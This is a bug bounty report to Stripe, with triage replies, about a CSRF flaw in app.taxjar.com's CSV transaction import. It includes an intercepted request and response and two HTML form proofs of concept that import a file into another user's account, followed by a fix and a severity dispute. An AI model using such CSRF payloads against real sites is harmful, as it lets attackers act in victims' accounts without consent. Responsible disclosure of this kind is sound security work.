title: CSRF in Importing CSV files [app.taxjar.com]

profile.name: Stripe
profile.about: Stripe is a technology company that builds economic infrastructure for the internet.

vulnerability_information:
Greetings!

Basically, app.taxjar.com has a feature where we can import Transactions from CSV files. I've found that there is lack of CSRF protection in importing CSV documents. I was able to successfully craft a CSRF request.


## Steps to reproduce

1. Go to app.taxjar.com
2. Create two accounts. Alex and Attacker
3. From attacker, upload CSV document and intercept request
4. The request will look like this...

```
POST / HTTP/1.1
Host: taxjar-prod-bucket.s3.amazonaws.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://app.taxjar.com/
Content-Type: multipart/form-data; boundary=---------------------------211004162938951800283798959588
Content-Length: 4343
Origin: https://app.taxjar.com
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close

Upload spreadsheet
-----------------------------211004162938951800283798959588--

```
5. Right click on the request > Do Intercept > Response to this Requets
6. Server will send a response like this

```
HTTP/1.1 303 See Other
x-amz-id-2: MJfWMx2yTnmzg7tbPUlbMLwHCuGJ1bc4MFbj9grzTnwllI0vCEPjDmyWwlpbCTH5RocOPMzjt14=
x-amz-request-id: 4GHN118T2HRAEAQD
Date: Fri, 15 Jul 2022 12:59:06 GMT
ETag: "08ce40c27af955f3cae668e9785abd3e"
Location: https://app.taxjar.com/csv_imports/upload_complete?bucket=taxjar-prod-bucket&key=uploads%2Fe996ac74-689e-4fae-872b-16c537050062%2FCSV_V1_Template.csv&etag=%2208ce40c27af955f3cae668e9785abd3e%22
Server: AmazonS3
Content-Length: 0
Connection: close
```
7. Copy the link in Location header and paste it to alex's account.
8. You will see a file will be imported to her account. 

## POC

```
<!DOCTYPE html>
<html>
<body>
	<form method="GET" action="https://app.taxjar.com/csv_imports/upload_complete?bucket=taxjar-prod-bucket&key=uploads%2Fc73ea1e5-2fa4-4bbe-8f76-d3dfaac39e6f%2FCSV_V2_Template.csv&etag=%22ae5b1f53b6fc912a0980360c0314bdaa%22">
		<input type="text" name="bucket" value="taxjar-prod-bucket">
		<input type="text" name="key" value="uploads/c73ea1e5-2fa4-4bbe-8f76-d3dfaac39e6f/CSV_V2_Template.csv">
                <input type="text" name="etag" value="%22ae5b1f53b6fc912a0980360c0314bdaa%22">
	<input type="submit" value="Send">
	</form>
</body>
</html>
```

## Impact

CSRF attack, Attacker can import Transactions into user's account without his / her permission.

activities.message:
Hi @long_cat,

Attacker do not need to obtain alex's response.

## Steps

1. Attacker will upload a file to the server from his own account
2. Intercepts the **response** of the "POST" upload request
3. Drops that request so that request can't go to his (attacker's) account
4. crafts a CSRF payload and serves that to alex. 

## Video POC

{F1823488}

Hi @long_cat,

The error is because we can only use the link one time. If we try to use the same link again, we will get that error. Also please note that when you import CSV from attacker's account, make sure to drop the request from Burp suite so that it won't pass. The link will not wok twice. 

Do you mind trying this POC instead?


```
<!DOCTYPE html>
<html>
<body>
	<form method="GET" action="https://app.taxjar.com/csv_imports/upload_complete?bucket=taxjar-prod-bucket&key=uploads%2F162991d0-f3c1-4e6d-a0b5-13ce70ec5513%2FCSV_V1_Template.csv&etag=%2208ce40c27af955f3cae668e9785abd3e%22">
		<input type="text" name="bucket" value="taxjar-prod-bucket">
		<input type="text" name="key" value="uploads/162991d0-f3c1-4e6d-a0b5-13ce70ec5513/CSV_V1_Template.csv">
                <input type="text" name="etag" value="%2208ce40c27af955f3cae668e9785abd3e%22">
	<input type="submit" value="Send">
	</form>
</body>
</html>
```

Hi @bashcancare,

Thanks for the additional information and the PoC. I was able to get it to work and will be moving this report forward shortly.

Best regards,
@long_cat

Hello @bashcancare,

Thank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.

Thanks,
@long_cat
Thank you very much for your report. Please sit tight and we'll get back to you when we have an update!
Thank you again for your report. We're going to review your report and get back to you soon on bounty information!

Thanks again for your report.

I’m pleased to let you know that we have fixed the vulnerability you identified. I’m also pleased to inform you that your report is eligible for our vulnerability reward program, and so we’d like to offer you a reward. Congratulations!

A note on severity, we downgraded from a `Medium` to a `Low` because we consider this behavior a minor annoyance as opposed to the "sensitive action" that's required for CSRF to be in scope for reports as per our scope:

> Cross-Site Request Forgery (CSRF) on unauthenticated forms or forms with no sensitive actions

We appreciate your time and effort in submitting this report! Please take this time to re-review [Stripe’s program terms and conditions](https://hackerone.com/stripe?type=team#user-content-terms-and-conditions) and we hope to hear from you if you discover any issues within the scope of [our bug bounty program](https://hackerone.com/stripe)!

Hi @caffeinatingllama,

CSRFs are generally considered as medium severity impact issues. You've downgraded severity based on the sentence 

`
    Cross-Site Request Forgery (CSRF) on unauthenticated forms or forms with no sensitive actions
`

This does not apply here. The issue i reported was a sensitive action. Attacker was able to import spreadsheets into user's account.


I'm really disappointed with the new severity set up by stripe. Please re-consider severity using CVSS. 

Kind regards,
@bashcancare

Hi @bashcancare, thanks for following up! Again, this is not considered a "sensitive action". Sensitive actions would be things on par with modifying administrative settings.

We do use CVSS but reserve the right to make modifications based on business impact as per our program policy:

> Stripe uses CVSS 3.0 and **may adjust severity up or down based on business impact.**

In this case, the business impact is a minor annoyance and we appropriately downgraded the severity. Hopefully this clarifies our stance and we'd love to hear from you again if you discover any further issues within the scope of our program. :)
